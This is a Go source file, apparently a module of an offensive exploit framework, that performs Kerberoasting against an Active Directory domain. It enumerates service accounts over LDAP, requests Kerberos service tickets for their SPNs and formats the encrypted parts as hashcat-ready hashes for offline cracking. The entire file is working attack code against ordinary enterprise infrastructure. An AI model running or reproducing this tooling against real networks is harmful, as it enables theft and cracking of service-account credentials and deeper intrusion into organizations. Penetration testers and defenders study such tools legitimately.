package ad

import (
	"context"
	"encoding/hex"
	"fmt"
	"strings"

	ldaplib "github.com/go-ldap/ldap/v3"
	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/suggestions"
	"google.golang.org/protobuf/proto"
)

func init() {
	plugin.Global.Register(&KerberoastModule{})
}

type KerberoastModule struct{}

func (m *KerberoastModule) Name() string        { return "kerberoast" }
func (m *KerberoastModule) Description() string { return "Kerberoasting - extract TGS tickets for offline cracking" }

func (m *KerberoastModule) Execute(ctx context.Context, cfgData []byte) ([]byte, error) {
	cfg := &pb.KerberoastConfig{}
	if err := proto.Unmarshal(cfgData, cfg); err != nil {
		return nil, fmt.Errorf("unmarshal kerberoast config: %w", err)
	}

	result, err := runKerberoast(ctx, cfg)
	if err != nil {
		return nil, err
	}

	return proto.Marshal(result)
}

func runKerberoast(_ context.Context, cfg *pb.KerberoastConfig) (*pb.KerberoastResult, error) {
	if cfg.Domain == "" {
		return nil, fmt.Errorf("domain required")
	}
	if cfg.Username == "" || cfg.Password == "" {
		return nil, fmt.Errorf("username and password required")
	}

	dc := cfg.TargetDc
	if dc == "" {
		return nil, fmt.Errorf("target_dc required")
	}

	// If no SPNs provided, enumerate kerberoastable accounts via LDAP
	spns := cfg.TargetSpns
	var samMap = make(map[string]string) // SPN -> sAMAccountName

	if len(spns) == 0 {
		ldapAddr := dc
		if !strings.Contains(ldapAddr, ":") {
			ldapAddr = ldapAddr + ":389"
		}
		conn, err := ldaplib.Dial("tcp", ldapAddr)
		if err != nil {
			return nil, fmt.Errorf("LDAP connect for SPN enum: %w", err)
		}
		defer conn.Close()

		bindDN := fmt.Sprintf("%s@%s", cfg.Username, cfg.Domain)
		if err := conn.Bind(bindDN, cfg.Password); err != nil {
			return nil, fmt.Errorf("LDAP bind for SPN enum: %w", err)
		}

		baseDN := domainToBaseDN(cfg.Domain)
		accounts, err := EnumKerberoastable(conn, baseDN)
		if err != nil {
			return nil, fmt.Errorf("enumerate kerberoastable: %w", err)
		}

		for _, acct := range accounts {
			spns = append(spns, acct.SPN)
			samMap[acct.SPN] = acct.SAM
		}
	}

	if len(spns) == 0 {
		return &pb.KerberoastResult{}, nil
	}

	// Build Kerberos config
	krbConf := buildKrbConfig(cfg.Domain, dc)

	cl := client.NewWithPassword(cfg.Username, cfg.Domain, cfg.Password, krbConf,
		client.DisablePAFXFAST(true))

	err := cl.Login()
	if err != nil {
		return nil, fmt.Errorf("kerberos login: %w", err)
	}
	defer cl.Destroy()

	var hashes []*pb.KerberoastHash

	for _, spn := range spns {
		// Request TGS ticket for the SPN
		tkt, key, err := cl.GetServiceTicket(spn)
		if err != nil {
			continue
		}

		encPart := tkt.EncPart
		hashStr := formatHashcatHash(spn, cfg.Domain, samMap[spn], encPart.EType, hex.EncodeToString(encPart.Cipher))
		encType := fmt.Sprintf("etype%d", key.KeyType)

		hashes = append(hashes, &pb.KerberoastHash{
			Spn:            spn,
			SamAccountName: samMap[spn],
			Hash:           hashStr,
			EncryptionType: encType,
		})
	}

	result := &pb.KerberoastResult{Hashes: hashes}
	result.NextSuggestedActions = suggestions.ForKerberoast(result)
	return result, nil
}

func formatHashcatHash(spn, domain, samName string, etype int32, cipher string) string {
	switch etype {
	case 23: // RC4-HMAC (hashcat mode 13100)
		return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s", samName, domain, spn, cipher)
	case 17: // AES128 (hashcat mode 19600)
		return fmt.Sprintf("$krb5tgs$17$%s$%s$*%s*$%s", samName, domain, spn, cipher)
	case 18: // AES256 (hashcat mode 19700)
		return fmt.Sprintf("$krb5tgs$18$%s$%s$*%s*$%s", samName, domain, spn, cipher)
	default:
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$%s$%s", etype, samName, domain, spn, cipher)
	}
}

func buildKrbConfig(domain, dc string) *config.Config {
	realm := strings.ToUpper(domain)
	cfgStr := fmt.Sprintf(`[libdefaults]
  default_realm = %s
  dns_lookup_realm = false
  dns_lookup_kdc = false
  default_tgs_enctypes = aes256-cts-hmac-sha1-96 rc4-hmac
  default_tkt_enctypes = aes256-cts-hmac-sha1-96 rc4-hmac

[realms]
  %s = {
    kdc = %s:88
    admin_server = %s:749
  }

[domain_realm]
  .%s = %s
  %s = %s
`, realm, realm, dc, dc, strings.ToLower(domain), realm, strings.ToLower(domain), realm)

	c, _ := config.NewFromString(cfgStr)
	return c
}
